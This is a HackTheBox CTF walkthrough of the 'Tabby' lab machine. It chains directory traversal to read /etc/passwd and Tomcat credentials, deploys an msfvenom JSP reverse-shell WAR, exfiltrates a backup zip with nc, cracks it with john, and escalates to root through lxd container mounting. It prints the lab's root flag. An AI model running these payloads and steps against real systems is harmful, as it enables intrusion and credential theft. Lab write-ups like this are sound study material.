# HackTheBox Tabby

> Author: Hades

> [*Scripting here*](https://github.com/leecybersec/scripting)

![](images/1.png)

## Information Gathering

### Openning Services

```
### Port Scanning ############################
nmap -sS -Pn -p- --min-rate 1000 10.10.10.194
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

[+] Openning ports: 22,80,8080

### Services Enumeration ############################
nmap -sC -sV -Pn 10.10.10.194 -p22,80,8080
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-07 17:36 +07
Nmap scan report for 10.10.10.194
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.99 seconds
```

### Apache httpd 2.4.41

At port 80, this is web application `megahosting`.

![](images/2.png)

At the All URLs of home page, I saw a link `http://megahosting.htb/news.php?file=statement` to get contain of file `statement`.

```
### Web Enumeration (80) ############################
                                                                                                                                                                            
[+] Header
HTTP/1.1 200 OK                                                                                                                                                             
Date: Thu, 08 Apr 2021 03:26:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8


[+] All URLs
<title>Mega Hosting</title>
<snip>
<li><a href="http://megahosting.htb/news.php?file=statement">News</a></li>
<snip>
```

But the url using domain `megahosting.htb`, I add this domain to file hosts.

```
┌──(root💀kali)-[/home/kali/scripting]
└─# echo '10.10.10.194 megahosting.htb' >> /etc/hosts
```

Go to this url in the browser.

![](images/3.png)

Try to sent directory traversal payload to read system file and it works.

```
┌──(Hades㉿10.10.14.5)-[0.4:23.2]~
└─$ curl 'http://megahosting.htb/news.php?file=../../../../../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
<snip>
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

### Apache Tomcat 9

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/tabby)

At port 8080, it is tomcat 9 in a default page.

![](images/7.png)

I tried to guess some default credential for manager page, but I can't get in. But there is a directory traversal vulnerability in port 80, let's use it to find the credential for manager page.

![](images/5.png)

## Foothold

### Path Travel to Tomcat Creds

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/tabby)

I search location of file `tomcat-users.xml` and this is helpful [File list of package tomcat9](https://packages.ubuntu.com/focal/all/tomcat9/filelist).

![](images/4.png)

Using directory traversal vulberability at port 80 to read file `tomcat-users.xml`. I have credential `tomcat:$3cureP4s5w0rd123!` with role `admin-gui` and `manager-script`.

```
┌──(Hades㉿10.10.14.5)-[0.5:27.1]~/scripting
└─$ curl 'http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml'
<snip>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

### Manager script deploy

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/tabby)

Follow role of the knowed credential, I search for deploy shell with manager script and I found [Deploy\_A\_New\_Application\_Archive\_(WAR)\_Remotely](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html\#Deploy\_A\_New\_Application\_Archive\_(WAR)\_Remotely)

Deployt a war file at `http://localhost:8080/manager/text/deploy?path=/foo`

This link [tomcat manager deploy](https://gist.github.com/pete911/6111816) guide how to deploy with `curl`.

`curl --upload-file appplication-0.1-1.war "http://tomcat:tomcat@localhost:8080/manager/deploy?path=/application-0.1-1`

First, I create `shell.war` using msfvenom

```
┌──(Hades㉿10.10.14.5)-[0.5:29.1]~/walkthrough/hackthebox/tabby
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war > shell.war
Payload size: 1100 bytes
Final size of war file: 1100 bytes
```

Using curl to upload shell file to server with knowed credential.
```
┌──(Hades㉿10.10.14.5)-[0.5:29.2]~/walkthrough/hackthebox/tabby
└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war 'http://megahosting.htb:8080/manager/text/deploy?path=/shell'
OK - Deployed application at context path [/shell]
```

Execute shell at url `http://megahosting.htb:8080/shell/`.

```
┌──(Hades㉿10.10.14.5)-[0.5:30.1]~/walkthrough/hackthebox/tabby
└─$ curl http://megahosting.htb:8080/shell/
```

At listener, I have reverse shell.

```
┌──(Hades㉿10.10.14.5)-[0.5:29.2]~
└─$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.194] 54320
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

## Privilege Escalation

### Zip Password Cracking

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/tabby)

After do some local enum in the server, I found a backup file at `/var/www/html/files`

```
tomcat@tabby:/var/www/html$ ls
assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt
tomcat@tabby:/var/www/html$ cd files
tomcat@tabby:/var/www/html/files$ ls
16162020_backup.zip  archive  revoked_certs  statement
tomcat@tabby:/var/www/html/files$ nc -nv 10.10.14.5 445 < 16162020_backup.zip
2021/04/08 04:16:19 CMD: UID=997  PID=62575  | nc -nv 10.10.14.5 445 
Connection to 10.10.14.5 445 port [tcp/*] succeeded!
```

Donwload file `16162020_backup.zip` to kali machine using `nc`

```
┌──(Hades㉿10.10.14.5)-[0.5:33.0]~/walkthrough/hackthebox/tabby
└─$ sudo nc -nvlp 445 > 16162020_backup.zip
listening on [any] 445 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.194] 50276
```

This file require password to unzip.

```
┌──(Hades㉿10.10.14.5)-[0.7:14.6]~/walkthrough/hackthebox/tabby
└─$ unzip 16162020_backup.zip
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
[16162020_backup.zip] var/www/html/favicon.ico password:
```

Let's using `zip2john` to get a hash of this file and crack it.

```
┌──(Hades㉿10.10.14.5)-[0.6:31.2]~/walkthrough/hackthebox/tabby
└─$ zip2john 16162020_backup.zip > hash
```

Using directory rockyou.txt to crack file hash and I got the password `admin@it`

```
┌──(Hades㉿10.10.14.5)-[0.6:31.2]~/walkthrough/hackthebox/tabby
└─$ john hash --wordlist=/home/kali/directory/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)
1g 0:00:00:01 DONE (2021-04-08 11:05) 0.6944g/s 7196Kp/s 7196Kc/s 7196KC/s adnc153..adenabuck
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Unzip this file but I don't have more info, this is only backup file for the web application.

```
┌──(Hades㉿10.10.14.5)-[0.6:31.3]~/walkthrough/hackthebox/tabby
└─$ unzip 16162020_backup.zip
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
[16162020_backup.zip] var/www/html/favicon.ico password: 
  inflating: var/www/html/favicon.ico  
   creating: var/www/html/files/
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt
```

In the other way, I try to login to user `ash` with some knowed password `$3cureP4s5w0rd123!` and `admin@it`.

With password `admin@it`, I got user permission.

```
tomcat@tabby:/home$ ls
ash
tomcat@tabby:/home$ su ash
Password: 
ash@tabby:/home$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

### lxd/lxc mount file

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/tabby)

Checking user ash, this user in lxd/lxc group

```
ash@tabby:/tmp$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

At [lxd/lxc Group - Privilege escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-1), I can follow it to get root

```
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
sudo go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
```

Make install with root account in kali machine

```
┌──(root💀kali)-[~/go/src/github.com/lxc/distrobuilder]
└─# make                                                                                                                                                                    
gofmt -s -w .
go install -v ./...
go: downloading gopkg.in/yaml.v2 v2.4.0
<snip>
distrobuilder built successfully
```

```
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
```

Build file lxd with `distrobuilder`

```
┌──(root💀kali)-[~/ContainerImages/alpine]
└─# /root/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
<snip>
┌──(root💀kali)-[~/ContainerImages/alpine]
└─# ls                                                                                                                                                                      
alpine.yaml  lxd.tar.xz  rootfs.squashfs
```

When I deploy file `lxd.tar.xz` while using reverse shell, I got error `No such file or directory` for file `lxd.tar.xz`. Let's add `authorized_keys` to server and using ssh with private key.

Deploy image again and it work.

```
ash@tabby:/tmp$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
Image imported with fingerprint: 344c9cfe47fc1c5ff64a553087b3e11649aa40dd47dc074b56488a700479f3bf
ash@tabby:/tmp$ lxc image list
+--------+--------------+--------+----------------------------------------+--------------+-----------+--------+-----------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |              DESCRIPTION               | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE         |
+--------+--------------+--------+----------------------------------------+--------------+-----------+--------+-----------------------------+
| alpine | 344c9cfe47fc | no     | Alpinelinux 3.8 x86_64 (20210408_0521) | x86_64       | CONTAINER | 1.92MB | Apr 8, 2021 at 5:49am (UTC) |
+--------+--------------+--------+----------------------------------------+--------------+-----------+--------+-----------------------------+
```

Get error while create comtainer.

```
ash@tabby:/tmp$ lxc init alpine privesc -c security.privileged=true
Creating privesc
Error: No storage pool found. Please create a new storage pool
```

Search error with google and I have to init before create container

```
ash@tabby:/tmp$ lxd init
<snip>
```

Create container again and it work

```
ash@tabby:/tmp$ lxc init alpine privesc -c security.privileged=true
Creating privesc
ash@tabby:/tmp$ lxc list                  
+---------+---------+------+------+-----------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |
+---------+---------+------+------+-----------+-----------+
| privesc | STOPPED |      |      | CONTAINER | 0         |
+---------+---------+------+------+-----------+-----------+
```

Mount container `privesc` with path `/mnt/root` to source from Tabby `/`. Go to check `/mnt/root` and I got file root.txt 

```
ash@tabby:/tmp$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
ash@tabby:/tmp$ lxc start privesc
ash@tabby:/tmp$ lxc exec privesc /bin/sh
~ # cd /mnt/root
/mnt/root # ls
bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var
boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr
/mnt/root # cat root/root.txt
ba2c48cc39dd91fdd4bc355dfa033265
```